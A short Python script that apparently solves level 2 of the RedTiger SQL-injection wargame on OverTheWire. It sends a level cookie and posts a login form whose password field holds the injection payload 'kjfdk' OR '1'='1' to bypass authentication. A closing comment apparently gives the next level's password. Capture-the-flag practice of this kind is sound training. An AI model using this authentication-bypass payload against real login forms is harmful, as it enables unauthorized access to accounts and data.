import requests

TARGET_URL = "https://redtiger.labs.overthewire.org/level2.php"
header = {"Cookie": "level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme"}

response = requests.get(TARGET_URL, headers=header)
print(response.text)

payload = {"username": "admin", "password": "kjfdk' OR '1'='1", "login": "Login"}
response = requests.post(TARGET_URL, headers=header, data=payload)
print(response.text)
# feed_the_cat_who_eats_your_bread
